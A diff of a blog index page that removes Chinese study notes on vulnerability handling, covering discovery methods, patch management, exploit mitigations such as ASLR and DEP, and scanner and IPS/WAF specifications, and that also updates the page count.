-<h2 id="四、网络安全漏洞处置技术"><a href="#四、网络安全漏洞处置技术" class="headerlink" title="四、网络安全漏洞处置技术"></a>四、网络安全漏洞处置技术</h2><h3 id="漏洞发现技术"><a href="#漏洞发现技术" class="headerlink" title="漏洞发现技术"></a>漏洞发现技术</h3><p>漏洞发现方法依赖于人工安全性分析、工具自动化检测及人工智能辅助分析。把已发现的漏洞进行总结，形成一个特征库，利用特征库进行智能化识别。</p>
-<blockquote>
-<p>文本搜索、词法分析、范围检查、状态机检查、错误注入、<strong>模糊测试</strong>、动态污点分析、形式化验证</p>
-</blockquote>
-<h3 id="补丁管理六环节-⭐"><a href="#补丁管理六环节-⭐" class="headerlink" title="补丁管理六环节 ⭐"></a>补丁管理六环节 ⭐</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现状分析 → 补丁跟踪 → 补丁验证 → 补丁安装 → 应急处理 → 补丁检查</span><br></pre></td></tr></table></figure>
-<h3 id="漏洞利用防范技术（5种）⭐"><a href="#漏洞利用防范技术（5种）⭐" class="headerlink" title="漏洞利用防范技术（5种）⭐"></a>漏洞利用防范技术（5种）⭐</h3><p>针对漏洞利用触发条件进行干扰和拦截。</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>技术</th>
-<th>原理</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>地址空间随机化（ASLR）</strong></td>
-<td>对程序加载内存地址随机化，使攻击者无法预知返回地址，防御缓冲区溢出</td>
-</tr>
-<tr>
-<td><strong>数据执行阻止（DEP）</strong></td>
-<td>将特定内存区域标注为<strong>非执行</strong>，保护堆栈区域</td>
-</tr>
-<tr>
-<td><strong>SEHOP</strong></td>
-<td>防止攻击者利用结构化异常处理（SEH）重写</td>
-</tr>
-<tr>
-<td><strong>堆栈保护</strong></td>
-<td>设置堆栈完整性标记，检测函数调用返回地址是否被篡改</td>
-</tr>
-<tr>
-<td><strong>虚拟补丁</strong></td>
-<td>不修改程序，通过过滤网络流量中的漏洞攻击数据包保护目标系统，由IPS/WAF实现</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h2 id="五、主要产品与技术指标"><a href="#五、主要产品与技术指标" class="headerlink" title="五、主要产品与技术指标"></a>五、主要产品与技术指标</h2><h3 id="漏洞扫描器技术指标-⭐"><a href="#漏洞扫描器技术指标-⭐" class="headerlink" title="漏洞扫描器技术指标 ⭐"></a>漏洞扫描器技术指标 ⭐</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>指标</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>扫描主机数量</td>
-<td>有无IP/域名限制</td>
-</tr>
-<tr>
-<td>并发数</td>
-<td>支持并发扫描任务数量</td>
-</tr>
-<tr>
-<td>扫描速度</td>
-<td>单位时间扫描效率</td>
-</tr>
-<tr>
-<td>漏洞检测能力</td>
-<td>数量、类型、是否覆盖主流OS/数据库/网络设备</td>
-</tr>
-<tr>
-<td>数据库漏洞检查</td>
-<td>Oracle/MySQL/MS SQL/DB2/Sybase/PostgreSQL/MongoDB</td>
-</tr>
-<tr>
-<td>Web应用漏洞检查</td>
-<td>SQL注入/XSS/网站挂马/网页木马/CGI漏洞</td>
-</tr>
-<tr>
-<td><strong>口令检查功能</strong></td>
-<td>SMB/Telnet/FTP/SSH/POP3/SQL Server/MySQL/Oracle等口令猜测</td>
-</tr>
-<tr>
-<td>标准兼容性</td>
-<td>兼容CVE/CNNVD/CNVD/BugTraq，提供CVE兼容证书</td>
-</tr>
-<tr>
-<td>部署环境</td>
-<td>是否支持虚拟化VM平台</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h3 id="漏洞防护网关技术指标"><a href="#漏洞防护网关技术指标" class="headerlink" title="漏洞防护网关技术指标"></a>漏洞防护网关技术指标</h3><blockquote>
-<p>常见产品：<strong>IPS、WAF（Web防火墙）、UTM（统一威胁管理）</strong></p>
-</blockquote>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>指标</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>阻断攻击种类与数量</td>
-<td>能防御的漏洞利用类型及数量</td>
-</tr>
-<tr>
-<td>阻断准确率</td>
-<td>检测并阻止漏洞利用的正确程度</td>
-</tr>
-<tr>
-<td>阻断性能</td>
-<td>单位时间内有效阻止的数量</td>
-</tr>
-<tr>
-<td>支持网络带宽能力</td>
-<td>对网络流量大小的控制能力</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h2 id="📌-高频考点速记"><a href="#📌-高频考点速记" class="headerlink" title="📌 高频考点速记"></a>📌 高频考点速记</h2><ol>
-<li><strong>零日漏洞</strong> = 无补丁 + 定向攻击</li>
-<li><strong>CVE ID格式</strong>：年份+数字，如 <code>CVE-2019-1543</code></li>
-<li><strong>CVSS三维度</strong>：基本度量 / 时序度量 / 环境度量</li>
-<li><strong>CNVD危害级别</strong>：高 / 中 / 低</li>
-<li><strong>漏洞管理5步</strong>：资产确认→采集→评估→消除控制→变化跟踪</li>
-<li><strong>漏洞消除方法</strong>：打补丁 / 升级系统 / 更新IPS特征库 / 变更管理流程</li>
-<li><strong>ASLR</strong> 防缓冲区溢出；<strong>DEP</strong> 防内存区域执行；<strong>虚拟补丁</strong> 靠流量过滤</li>
-<li><strong>补丁管理6环节</strong>：现状分析→跟踪→验证→安装→应急→检查</li>
-<li><strong>漏洞防护网关产品</strong>：IPS / WAF / UTM</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
